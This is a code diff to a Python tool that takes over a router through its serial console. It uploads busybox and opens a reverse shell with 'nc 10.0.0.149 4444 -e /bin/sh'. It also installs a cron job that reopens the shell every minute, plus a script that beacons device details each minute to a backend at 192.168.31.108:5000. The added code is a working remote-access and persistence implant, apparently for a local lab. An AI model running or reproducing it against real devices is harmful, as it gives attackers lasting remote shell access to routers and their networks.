@@ -16,6 +16,9 @@ DEV_SERIAL_PORT = "/dev/ttyS0"
 REVERSE_SHELL_IP   = "10.0.0.149"
 REVERSE_SHELL_PORT = 4444
 
+DEVICE_CONFIG = {"name":"router_asus2", "status":"ON", "shellIP":REVERSE_SHELL_IP, "shellPort":REVERSE_SHELL_PORT}
+BACKEND_ENDPOINT = "http://192.168.31.108:5000/updateGet"
+
 
 def read_data(ser):
     """
@@ -314,9 +317,9 @@ def check_web_server():
 def copy_file(ser, file_path, final_path):
     
     print()
-    print(Fore.CYAN + "+------------------------+")
-    print(Fore.CYAN + "|     COPYING  FILE      |")
-    print(Fore.CYAN + "+------------------------+")
+    print(Fore.YELLOW + "+------------------------+")
+    print(Fore.YELLOW + "|     COPYING  FILE      |")
+    print(Fore.YELLOW + "+------------------------+")
     
     network_status, rpi_ip = check_networking(ser)
     
@@ -338,15 +341,15 @@ def copy_file(ser, file_path, final_path):
         print(error)
 
 
-
+"""
 def copy_busybox(ser):
-    """
-        Copy the busybox binary to the router via wget from the router to the raspi /var/www/html
-    """
+    
+    #    Copy the busybox binary to the router via wget from the router to the raspi /var/www/html
+    
     print()
-    print(Fore.CYAN + "+------------------------+")
-    print(Fore.CYAN + "|    COPYING BUSYBOX     |")
-    print(Fore.CYAN + "+------------------------+")
+    print(Fore.YELLOW + "+------------------------+")
+    print(Fore.YELLOW + "|    COPYING BUSYBOX     |")
+    print(Fore.YELLOW + "+------------------------+")
     
     network_status, rpi_ip = check_networking(ser)
 
@@ -362,7 +365,7 @@ def copy_busybox(ser):
 
         print(Fore.RED + "Error pushing busybox file, error -> ")
         print(error)
-
+"""
 
 def get_reverse_shell(ser):
     """
@@ -373,11 +376,46 @@ def get_reverse_shell(ser):
     print(Fore.CYAN + "+------------------------+")
     print(Fore.CYAN + "|      REVERSE SHELL     |")
     print(Fore.CYAN + "+------------------------+")
+    
+    copy_file(ser, "./binaries/busybox-mipsel", "/tmp/busybox_el")
+    
     print("● Setting reverse shell to {}:{}".format(REVERSE_SHELL_IP, REVERSE_SHELL_PORT))
     send_command(ser, "chmod +x /tmp/busybox_el")
     send_command(ser, "/tmp/busybox_el nc {} {} -e /bin/sh &".format(REVERSE_SHELL_IP, REVERSE_SHELL_PORT))
 
 
+def config_crontab(ser):
+    
+    print()
+    print(Fore.CYAN + "+------------------------+")
+    print(Fore.CYAN + "|  CONFIGURING CRONTAB   |")
+    print(Fore.CYAN + "+------------------------+")
+    
+    
+    with open("./binaries/cronFile", "w") as cronfile:
+        cronfile.write("* * * * * /tmp/sendInfo.sh\n")
+        cronfile.write("* * * * * /tmp/busybox_el nc {} {} -e /bin/sh &".format(REVERSE_SHELL_IP, REVERSE_SHELL_PORT))
+        
+        
+    with open("./binaries/sendInfo.sh", "w") as infofile:
+        infofile.write('wget -O- "{}?'.format(BACKEND_ENDPOINT))
+        
+        for field in DEVICE_CONFIG:
+            print(field)
+            infofile.write("{}={}&".format(field, DEVICE_CONFIG[field]))
+            
+        infofile.write('"')
+            
+            
+        
+    
+    copy_file(ser, "./binaries/cronFile", "/tmp/cronFile")
+    copy_file(ser, "./binaries/sendInfo.sh", "/tmp/sendInfo.sh")
+    send_command(ser, "chmod +x /tmp/sendInfo.sh")
+    send_command(ser, "crontab /tmp/cronFile")
+    
+    
+    
 def auto_mode():
     """
         Usage: python3 main.py -d
@@ -419,11 +457,10 @@ def test_mode():
         ser = serial.Serial("/dev/ttyS0", baudrate)
 
         if check_if_terminal(ser):
-            get_info(ser)
-            copy_file(ser, "./binaries/busybox-mipsel", "/tmp/busybox_el")
-            get_reverse_shell(ser)
-            copy_file(ser, "/home/pi/Documents/wget_each_minute.sh", "/tmp/wget_each_minute.sh")
             
+            get_info(ser)            
+            get_reverse_shell(ser)
+            config_crontab(ser)           
             
             response = input("\n● Do you want to open the terminal? (Y/N) ")
 
@@ -487,10 +524,10 @@ def main():
     if sys.argv[1] == "-t" or sys.argv[1] == "--terminal":
         direct_terminal_mode()
 
-    if sys.argv[1] == "-d" or sys.argv[1] == "--debug":
+    elif sys.argv[1] == "-d" or sys.argv[1] == "--debug":
         test_mode()
             
-    if sys.argv[1] == "-a" or sys.argv[1] == "--automode":
+    elif sys.argv[1] == "-a" or sys.argv[1] == "--automode":
         auto_mode()
         
     else:
